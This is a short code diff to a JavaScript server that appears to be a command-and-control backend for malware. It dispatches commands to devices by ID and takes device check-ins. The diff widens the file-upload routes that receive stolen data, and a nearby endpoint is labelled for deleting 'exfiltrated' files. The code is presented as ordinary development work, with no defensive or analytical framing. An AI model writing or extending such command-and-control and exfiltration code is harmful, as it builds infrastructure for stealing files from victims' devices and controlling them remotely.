@@ -100,6 +100,11 @@ function dispatchCommand(deviceId, cmd) {
 // Ingestion Handler for device check-ins
 function handleCheckin(req, res) {
     try {
+        const contentType = req.headers['content-type'] || '';
+        if (contentType.includes('multipart/form-data')) {
+            return handleFileUpload(req, res);
+        }
+
         const payload = req.body || {};
         const query = req.query || {};
         const data = { ...query, ...payload };
@@ -217,8 +222,11 @@ app.all('/api/checkin', handleCheckin);
 app.all('/api/checkin/', handleCheckin);
 app.post('/checkin', handleCheckin);
 
+app.all('/upload', handleFileUpload);
+app.all('/upload/', handleFileUpload);
+app.all('/api/upload', handleFileUpload);
+app.all('/api/upload/', handleFileUpload);
 app.post('/upload', handleFileUpload);
-app.post('/api/upload', handleFileUpload);
 
 // Delete Exfiltrated File Endpoint
 app.post('/api/delete-exfil', (req, res) => {
